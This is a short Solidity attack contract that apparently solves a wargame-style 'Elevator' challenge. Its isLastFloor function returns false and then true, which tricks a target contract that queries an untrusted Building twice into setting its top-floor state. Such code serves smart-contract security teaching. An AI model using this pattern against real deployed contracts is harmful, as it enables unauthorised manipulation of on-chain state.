// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract Elevator2 is Building {
    bool flag;

    function isLastFloor(uint256) external override returns (bool) {
        if (!flag) {
            flag = true;
            return false;
        }
        return true;
    }

    function goUp(address elevator) external {
      Elevator(elevator).goTo(1);
    }
}
